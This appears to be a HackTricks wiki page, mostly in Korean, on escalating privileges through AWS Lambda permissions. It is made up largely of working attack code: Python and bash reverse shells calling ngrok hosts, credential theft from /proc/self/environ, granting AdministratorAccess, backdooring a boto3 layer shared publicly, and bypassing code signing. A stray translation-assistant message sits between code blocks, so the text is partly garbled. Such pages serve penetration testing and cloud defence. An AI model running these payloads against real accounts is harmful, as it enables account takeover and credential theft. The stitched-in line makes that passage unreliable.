# AWS - Lambda Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## lambda

lambda에 대한 자세한 내용:

{{#ref}}
../../aws-services/aws-lambda-enum.md
{{#endref}}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

다음 권한을 가진 사용자: **`iam:PassRole`, `lambda:CreateFunction`, and `lambda:InvokeFunction`** 는 권한을 상승시킬 수 있습니다.\
그들은 **새로운 Lambda function을 생성하고 기존의 IAM role을 할당**할 수 있으며, 이렇게 하면 그 role에 연관된 권한을 함수가 얻게 됩니다. 사용자는 이후 **이 Lambda function에 코드를 작성하고 업로드(예: rev shell)**할 수 있습니다.\
함수가 설정되면 사용자는 **AWS API를 통해 Lambda function을 호출하여** 실행을 트리거하고 의도한 동작을 수행할 수 있습니다. 이 방식은 사용자가 Lambda function을 통해 간접적으로 작업을 수행하며, 해당 IAM role에 부여된 접근 수준으로 동작할 수 있게 합니다.\\

공격자는 이를 악용해 **rev shell을 얻고 token을 탈취**할 수 있습니다:
```python:rev.py
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```

```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
또한 lambda function 자체에서 **abuse the lambda role permissions** 할 수도 있습니다.\
lambda role에 충분한 permissions가 있었다면, 이를 사용해 본인에게 admin rights를 부여할 수 있습니다:
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
외부 연결 없이도 lambda의 role credentials를 leak하는 것이 가능합니다. 이는 내부 작업에 사용되는 **네트워크 격리된 Lambdas**에 유용합니다. 알 수 없는 security groups가 your reverse shells을 필터링하고 있다면, 이 코드 조각은 lambda의 출력으로 credentials를 직접 leak할 수 있게 해줍니다.
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**잠재적 영향:** 지정된 임의의 lambda 서비스 역할로의 직접 privesc.

> [!CAUTION]
> 흥미로워 보일 수 있지만 **`lambda:InvokeAsync`**은(는) **단독으로는** **`aws lambda invoke-async`를 실행하는 것을** 허용하지 않으며, `lambda:InvokeFunction`도 필요합니다

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

이전 시나리오와 마찬가지로, `lambda:AddPermission` 권한이 있다면 **자신에게 `lambda:InvokeFunction` 권한을 부여할 수 있습니다**.
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**잠재적 영향:** 지정된 임의의 lambda 서비스 역할로의 직접 privesc.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

다음 권한을 가진 사용자 **`iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`**(및 잠재적으로 `dynamodb:PutItem`, `dynamodb:CreateTable`)는 `lambda:InvokeFunction` 없이도 간접적으로 **escalate privileges** 할 수 있습니다.\
이들은 **악성 코드가 포함된 Lambda function을 생성하고 기존 IAM role을 할당할 수 있습니다**.

사용자는 Lambda를 직접 호출하는 대신 기존 DynamoDB 테이블을 생성하거나 활용하고, 이를 event source mapping을 통해 Lambda에 연결합니다. 이 구성은 테이블에 **새 항목이 입력될 때 자동으로 트리거됨** 을 보장하며(사용자 동작이든 다른 프로세스든), 결과적으로 Lambda function을 간접적으로 호출하고 전달된 IAM role의 권한으로 코드를 실행합니다.
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
AWS 환경에 이미 DynamoDB가 활성화되어 있으면, 사용자는 Lambda 함수에 대해 **event source mapping을 설정하기만 하면 됩니다**. 그러나 DynamoDB가 사용되지 않는 경우, 사용자는 스트리밍이 활성화된 **새 테이블을 생성해야 합니다**:
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
이제 **Lambda function을 DynamoDB table에 연결**하려면 **event source mapping을 생성**하면 됩니다:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Lambda 함수가 DynamoDB 스트림에 연결되어 있으면, 공격자는 DynamoDB 스트림을 활성화하여 **간접적으로 Lambda를 트리거할 수 있습니다**. 이는 DynamoDB 테이블에 **항목을 삽입**함으로써 수행할 수 있습니다:
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**Potential Impact:** 지정된 lambda 서비스 역할에 대한 직접 privesc.

### `lambda:AddPermission`

이 권한을 가진 공격자는 **자신(또는 다른 사용자)에게 임의의 권한을 부여할 수 있습니다** (이는 리소스에 대한 액세스 권한을 부여하기 위한 리소스 기반 정책을 생성합니다):
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda invoke --function-name <func_name> /tmp/outout
```
**Potential Impact:** 코드 수정 및 실행 권한을 부여하여 사용 중인 lambda service role에 대해 직접적인 privesc를 얻을 수 있습니다.

### `lambda:AddLayerVersionPermission`

이 권한을 가진 공격자는 **자신(또는 다른 사용자)에게 `lambda:GetLayerVersion` 권한을 부여할 수 있습니다**. 레이어에 접근하여 취약점이나 민감한 정보를 검색할 수 있습니다
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
**Potential Impact:** 민감한 정보에 대한 잠재적 접근.

### `lambda:UpdateFunctionCode`

권한을 보유한 사용자 **`lambda:UpdateFunctionCode`** 는 **IAM 역할에 연결된 기존 Lambda 함수의 코드를 수정할 수 있는 가능성**이 있습니다.\
공격자는 **Lambda 코드를 수정하여 exfiltrate the IAM credentials** 할 수 있습니다.

공격자가 함수를 직접 호출할 수 있는 권한이 없을 수도 있지만, Lambda 함수가 이미 존재하고 운영 중이라면 기존 워크플로우나 이벤트를 통해 트리거될 가능성이 높아 수정된 코드의 실행을 간접적으로 허용할 수 있습니다.
```bash
# The zip should contain the lambda code (trick: Download the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
**Potential Impact:** 사용된 lambda 서비스 역할로의 직접 privesc.

### `lambda:UpdateFunctionConfiguration`

#### RCE via env variables

이 권한으로 Lambda에 임의의 코드를 실행하게 하는 환경 변수를 추가할 수 있습니다. 예를 들어 python에서는 환경 변수 `PYTHONWARNING`와 `BROWSER`를 악용해 python 프로세스가 임의의 명령을 실행하도록 만들 수 있습니다:
```bash
aws --profile none-priv lambda update-function-configuration --function-name <func-name> --environment "Variables={PYTHONWARNINGS=all:0:antigravity.x:0:0,BROWSER=\"/bin/bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/18755 0>&1' & #%s\"}"
```
다른 스크립팅 언어의 경우 사용할 수 있는 다른 env 변수들이 있습니다. 자세한 내용은 다음의 스크립팅 언어 하위 섹션을 확인하세요:

{{#ref}}
https://book.hacktricks.wiki/en/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/index.html
{{#endref}}

#### RCE via Lambda Layers

[**Lambda Layers**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) 은 lamdba 함수에 **code**를 포함할 수 있게 해주지만 **별도로 저장**하여 함수 코드를 작게 유지하고 **여러 함수가 code를 공유할 수 있다**.

lambda 내부에서는 다음과 같은 함수로 python code가 로드되는 경로를 확인할 수 있습니다:
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
These are the places:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

For example, the library boto3 is loaded from `/var/runtime/boto3` (4th position).

#### 악용

권한 `lambda:UpdateFunctionConfiguration` 를 악용해서 람다 함수에 **새 레이어를 추가**할 수 있습니다. 임의 코드를 실행하려면 이 레이어가 람다가 **임포트할 라이브러리**를 포함해야 합니다. 람다 코드를 읽을 수 있다면 이를 쉽게 찾을 수 있고, 해당 람다가 **이미 레이어를 사용 중일 수 있으며**, 그 레이어를 **다운로드**하여 **코드를 추가**할 수도 있다는 점을 유의하세요.

For example, lets suppose that the lambda is using the library boto3, this will create a local layer with the last version of the library:
```bash
pip3 install -t ./lambda_layer boto3
```
`./lambda_layer/boto3/__init__.py` 파일을 열고 **전역 코드에 backdoor를 추가**할 수 있습니다 (예: exfiltrate credentials를 전송하거나 reverse shell을 얻는 함수).

그런 다음 `./lambda_layer` 디렉터리를 zip으로 압축하고 **upload the new lambda layer**를 자신의 계정에 업로드하세요(또는 피해자 계정에 업로드할 수 있으나 권한이 없을 수 있습니다).\
참고: /opt/python/boto3를 오버라이드하려면 python 폴더를 생성하고 그 안에 라이브러리를 넣어야 합니다. 또한 레이어는 lambda에서 사용하는 **compatible with the python version**이어야 하며, 계정에 업로드할 경우 **same region:**
```bash
aws lambda publish-layer-version --layer-name "boto3" --zip-file file://backdoor.zip --compatible-architectures "x86_64" "arm64" --compatible-runtimes "python3.9" "python3.8" "python3.7" "python3.6"
```
이제 업로드된 lambda layer를 **모든 계정에서 접근 가능하도록**:
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
그리고 lambda layer를 피해자 lambda function에 연결하세요:
```bash
aws lambda update-function-configuration \
--function-name <func-name> \
--layers arn:aws:lambda:<region>:<attacker-account-id>:layer:boto3:1 \
--timeout 300 #5min for rev shells
```
다음 단계는 우리가 직접 **함수를 호출(invoke the function)** 할 수 있다면 그렇게 하거나, 정상적인 방법으로 **함수가 호출될 때까지 기다리는 것**인데 — 후자가 더 안전한 방법입니다.

**이 취약점을 보다 은밀하게 악용하는 방법**은 다음에서 확인할 수 있습니다:

{{#ref}}
../../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md
{{#endref}}

**Potential Impact:** 사용된 lambda 서비스 역할에 대한 직접 privesc.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

해당 권한들이 있으면 함수를 생성하고 URL을 호출해 실행할 수 있을지도 모릅니다... 하지만 테스트할 방법을 찾지 못했으니, 시도하시면 알려주세요!

### Lambda MitM

일부 lambda는 파라미터로부터 사용자들이 보내는 **민감한 정보를 수신(receiving sensitive info from the users in parameters.)** 합니다. 그 중 하나에서 RCE를 얻으면, 다른 사용자가 해당 함수에 보내는 정보를 exfiltrate할 수 있습니다. 자세한 내용은 다음을 확인하세요:

{{#ref}}
../../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md
{{#endref}}

## References

- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

{{#include ../../../../banners/hacktricks-training.md}}




### `lambda:DeleteFunctionCodeSigningConfig` or `lambda:PutFunctionCodeSigningConfig` + `lambda:UpdateFunctionCode` — Bypass Lambda Code Signing

Lambda 함수가 code signing을 강제하는 경우, Code Signing Config(CSC)를 제거하거나 Warn으로 강등할 수 있는 공격자는 서명되지 않은 코드를 함수에 배포할 수 있습니다. 이는 함수의 IAM role이나 트리거를 변경하지 않고도 무결성 보호를 우회합니다.

권한(다음 중 하나):
- Path A: `lambda:DeleteFunctionCodeSigningConfig`, `lambda:UpdateFunctionCode`
- Path B: `lambda:CreateCodeSigningConfig`, `lambda:PutFunctionCodeSigningConfig`, `lambda:UpdateFunctionCode`

Notes:
- Path B의 경우, CSC 정책이 `WARN`(unsigned artifacts allowed)으로 설정되어 있으면 AWS Signer 프로필이 필요 없습니다.

Steps (REGION=us-east-1, TARGET_FN=<target-lambda-name>):

작은 페이로드를 준비하세요:
```bash
cat > handler.py <<'PY'
import os, json
def lambda_handler(event, context):
return {"pwn": True, "env": list(os.environ)[:6]}
PY
zip backdoor.zip handler.py
```
경로 A) CSC를 제거한 다음 code를 업데이트:
```bash
aws lambda get-function-code-signing-config --function-name $TARGET_FN --region $REGION && HAS_CSC=1 || HAS_CSC=0
if [ "$HAS_CSC" -eq 1 ]; then
aws lambda delete-function-code-signing-config --function-name $TARGET_FN --region $REGION
fi
aws lambda update-function-code --function-name $TARGET_FN --zip-file fileb://backdoor.zip --region $REGION
# If the handler name changed, also run:
aws lambda update-function-configuration --function-name $TARGET_FN --handler handler.lambda_handler --region $REGION
```
경로 B) Warn으로 다운그레이드하고 코드 업데이트 (삭제가 허용되지 않는 경우):
```bash
CSC_ARN=$(aws lambda create-code-signing-config \
--description ht-warn-csc \
--code-signing-policies UntrustedArtifactOnDeployment=WARN \
--query CodeSigningConfig.CodeSigningConfigArn --output text --region $REGION)
aws lambda put-function-code-signing-config --function-name $TARGET_FN --code-signing-config-arn $CSC_ARN --region $REGION
aws lambda update-function-code --function-name $TARGET_FN --zip-file fileb://backdoor.zip --region $REGION
# If the handler name changed, also run:
aws lambda update-function-configuration --function-name $TARGET_FN --handler handler.lambda_handler --region $REGION
```
Please paste the contents of src/pentesting-cloud/aws-security/aws-privilege-escalation/aws-lambda-privesc/README.md here and I will translate the relevant English to Korean per your rules (keeping code, tags, links, paths and specified words unchanged).
```bash
aws lambda invoke --function-name $TARGET_FN /tmp/out.json --region $REGION >/dev/null
cat /tmp/out.json
```
잠재적 영향: 서명된 배포만 적용되도록 설정된 함수에 임의의 서명되지 않은 코드를 업로드하고 실행할 수 있어, 해당 함수 역할의 권한으로 코드 실행이 발생할 수 있습니다.

정리:
```bash
aws lambda delete-function-code-signing-config --function-name $TARGET_FN --region $REGION || true
```

